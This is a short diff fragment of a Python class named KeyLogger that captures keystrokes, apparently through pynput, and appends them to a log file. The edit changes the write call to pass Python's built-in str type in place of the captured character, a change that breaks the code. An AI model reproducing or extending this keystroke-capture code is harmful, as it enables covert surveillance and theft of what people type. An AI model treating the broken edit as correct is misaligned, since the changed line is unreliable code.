@@ -14,7 +14,7 @@ class KeyLogger:
         with open(self.log_file, 'a') as logkey:
             try:
                 char = key.char
-                logkey.write(char)
+                logkey.write(str)
             except AttributeError:
                 if key == keyboard.Key.space:
                     logkey.write(' ')
